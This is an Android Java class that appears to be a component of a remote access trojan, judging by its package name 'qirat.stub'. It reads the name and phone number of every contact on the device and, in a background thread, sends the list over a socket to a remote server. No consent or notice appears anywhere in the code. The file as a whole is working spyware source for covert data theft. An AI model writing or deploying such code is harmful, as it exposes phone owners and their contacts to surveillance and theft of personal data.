package com.qirat.stub;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {

    private static final String TAG = "ContactsManager";

    public static JSONObject getContacts(Context context) {
        JSONObject contacts = new JSONObject();
        JSONArray list = new JSONArray();
        Cursor cur = null;
        try {
            cur = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cur == null) {
                Log.e(TAG, "Cursor is null.");
                return null;
            }

            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                contact.put("name", name);
                contact.put("phoneNo", num);
                list.put(contact);
            }
            contacts.put("contactsList", list);
            Log.d(TAG, "Contacts collection complete.");
            return contacts;
        } catch (JSONException | IllegalArgumentException e) {
            Log.e(TAG, "Error getting contacts list", e);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return null;
    }


    public static void sendContactsToServer(Context context) {
        new Thread(() -> {
            JSONObject contactsList = getContacts(context);
            if (contactsList == null) {
                Log.e(TAG, "Cannot send contacts list, the collected list is null.");
                return;
            }


            Socket socket = Socket.getInstance(context);
            if (socket.isConnected()) {
                Log.d(TAG, "Sending contacts list to server...");
                socket.sendData("CONTACTS:" + contactsList.toString());
            } else {
                Log.e(TAG, "Cannot send contacts list, socket not connected.");
            }
        }).start();
    }
}
